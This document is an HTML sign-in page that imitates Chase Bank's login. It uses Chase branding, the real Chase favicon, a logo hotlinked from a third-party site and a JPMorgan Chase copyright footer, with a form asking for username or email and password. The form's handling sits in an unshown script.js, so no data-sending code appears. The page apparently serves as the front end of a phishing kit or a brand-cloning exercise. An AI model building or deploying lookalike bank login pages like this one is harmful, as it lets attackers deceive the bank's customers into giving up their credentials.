<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chase Bank - Sign In</title>
  <link rel="stylesheet" href="styles.css">
  <link rel="icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
</head>
<body class="chase-bg">
  <header class="chase-header">
    <img src="https://download.logo.wine/logo/Chase_Bank/Chase_Bank-Logo.wine.png" alt="Chase Logo" class="chase-logo">
    <nav>
      <a href="#">Personal</a>
      <a href="#">Business</a>
      <a href="#">Commercial</a>
    </nav>
  </header>
  <main class="login-main">
    <div class="login-container">
      <img src="https://download.logo.wine/logo/Chase_Bank/Chase_Bank-Logo.wine.png" alt="Chase Logo" class="chase-logo login-logo">
      <h1 class="login-title">Sign in</h1>
      <form id="loginForm" class="login-form">
        <div class="form-group">
          <label for="email">Username or Email</label>
          <input type="email" id="email" name="email" required placeholder="Username or Email">
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" required placeholder="Password">
        </div>
        <button type="submit" class="chase-btn login-btn">Sign in</button>
        <div id="loginError" class="error-msg"></div>
      </form>
      <div class="login-links">
        <a href="#">Forgot username/password?</a>
        <span class="divider">|</span>
        <a href="#">Open an account</a>
      </div>
    </div>
  </main>
  <footer class="chase-footer">
    <img src="https://download.logo.wine/logo/Chase_Bank/Chase_Bank-Logo.wine.png" alt="Chase Logo" class="chase-logo" style="height:32px;vertical-align:middle;margin-right:0.5rem;">
    <span>&copy; 2025 JPMorgan Chase & Co.</span>
  </footer>
  <script src="script.js"></script>
</body>
</html>
